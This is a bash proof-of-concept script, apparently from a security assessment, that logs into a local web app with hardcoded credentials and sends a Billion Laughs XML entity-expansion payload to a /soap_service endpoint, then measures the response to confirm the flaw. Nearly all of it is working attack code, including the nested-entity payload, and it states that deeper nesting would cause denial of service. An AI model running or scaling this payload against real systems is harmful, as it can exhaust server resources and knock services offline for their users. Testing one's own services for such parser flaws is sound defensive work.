#!/bin/bash

# POC: XML Entity Expansion (Billion Laughs) DoS Attack
# Target: /soap_service endpoint
# Description: Demonstrates exponential entity expansion causing resource exhaustion

TARGET="http://localhost:8080"
ENDPOINT="/soap_service"

echo "========================================"
echo "XML Entity Expansion (Billion Laughs) POC"
echo "========================================"
echo ""

# Step 1: Login to get session cookie
echo "[*] Step 1: Authenticating to obtain session cookie..."
LOGIN_RESPONSE=$(curl -s -c cookies.txt -X POST "${TARGET}/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
if [ "$HTTP_CODE" != "302" ]; then
    echo "[!] Login failed with HTTP code: $HTTP_CODE"
    exit 1
fi
echo "[+] Successfully authenticated"
echo ""

# Step 2: Create XML with entity expansion attack
echo "[*] Step 2: Creating Billion Laughs XML payload..."
cat > /tmp/billion_laughs.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<GetAccountInfoRequest>
    <account_id>&lol4;</account_id>
</GetAccountInfoRequest>
EOF

echo "[+] Payload created with 4 levels of entity expansion"
echo "[+] Expected expansion: lol -> 10x -> 100x -> 1000x"
echo ""

# Step 3: Send the attack payload
echo "[*] Step 3: Sending XML Entity Expansion attack..."
echo "[*] Measuring response size and timing..."
START_TIME=$(date +%s.%N)

RESPONSE=$(curl -s -b cookies.txt -X POST "${TARGET}${ENDPOINT}" \
  -H "Content-Type: text/xml" \
  -d @/tmp/billion_laughs.xml \
  -w "\nHTTP_CODE:%{http_code}\nSIZE:%{size_download}\nTIME:%{time_total}")

END_TIME=$(date +%s.%N)

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
RESPONSE_SIZE=$(echo "$RESPONSE" | grep "SIZE" | cut -d: -f2)
RESPONSE_TIME=$(echo "$RESPONSE" | grep "TIME" | cut -d: -f2)
RESPONSE_BODY=$(echo "$RESPONSE" | grep -v "HTTP_CODE" | grep -v "SIZE" | grep -v "TIME")

echo ""
echo "========================================"
echo "ATTACK RESULTS"
echo "========================================"
echo "[+] HTTP Status Code: $HTTP_CODE"
echo "[+] Response Size: $RESPONSE_SIZE bytes"
echo "[+] Response Time: $RESPONSE_TIME seconds"
echo ""

# Step 4: Analyze the expansion
INPUT_SIZE=$(wc -c < /tmp/billion_laughs.xml)
echo "[*] Input XML Size: $INPUT_SIZE bytes"
echo "[*] Output Response Size: $RESPONSE_SIZE bytes"

if [ "$RESPONSE_SIZE" -gt 1000 ]; then
    EXPANSION_FACTOR=$(echo "scale=2; $RESPONSE_SIZE / $INPUT_SIZE" | bc)
    echo "[+] Expansion Factor: ${EXPANSION_FACTOR}x"
    echo ""
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Entity expansion succeeded - the server processed recursive entities"
    echo "[+] This can be exploited to cause DoS by increasing nesting depth"
    echo ""
    
    # Show a preview of the expanded content
    echo "[*] Response Preview (first 500 characters):"
    echo "----------------------------------------"
    echo "$RESPONSE_BODY" | head -c 500
    echo ""
    echo "----------------------------------------"
    echo ""
    
    # Count how many times "lol" appears in the response
    LOL_COUNT=$(echo "$RESPONSE_BODY" | grep -o "lol" | wc -l)
    echo "[*] The string 'lol' appears approximately $LOL_COUNT times in the response"
    echo "[*] Expected count: 1000 (from 4 levels: 10^3)"
    
    if [ "$LOL_COUNT" -gt 100 ]; then
        echo "[+] Entity expansion worked as expected!"
    fi
else
    echo "[!] Response size is smaller than expected"
    echo "[!] Entity expansion may have been blocked or limited"
fi

# Cleanup
rm -f /tmp/billion_laughs.xml cookies.txt

echo ""
echo "========================================"
echo "POC Complete"
echo "========================================"